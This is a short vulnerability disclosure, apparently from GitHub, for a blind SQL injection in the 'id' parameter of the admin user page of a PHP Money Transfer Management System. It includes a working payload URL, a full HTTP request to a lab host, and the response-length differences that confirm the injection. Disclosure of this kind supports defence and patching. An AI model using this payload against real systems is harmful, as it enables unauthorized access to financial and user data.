# Money Transfer Management System v1.0 by oretnom23 has SQL injection

**Author：** k0xx

vendors: https://www.sourcecodester.com/php/15015/money-transfer-management-system-send-money-businesses-php-free-source-code.html

Vulnerability File: /mtms/admin/?page=user/manage_user&id=

Vulnerability location: /mtms/admin/?page=user/manage_user&id=,id

[+] Payload: /mtms/admin/?page=user/manage_user&id=1%27%20and%20length(database())%20=%207--+ // Leak place ---> id

Current database name: mtms_db,length is 7

```sql
GET /mtms/admin/?page=user/manage_user&id=1%27%20and%20length(database())%20=%207--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bnvs2lhahed1884v0nf12nt52s
Connection: close
// Leak place ---> id
```

When length (database ()) = 7, Content-Length: 27338
![image](https://user-images.githubusercontent.com/54017627/164715853-a368a3bb-d941-42f6-b826-cbc91246622b.png)


When length (database ()) = 8, Content-Length: 27482
![image](https://user-images.githubusercontent.com/54017627/164715990-4a4b6be2-0709-4038-b333-1e3164e2a543.png)
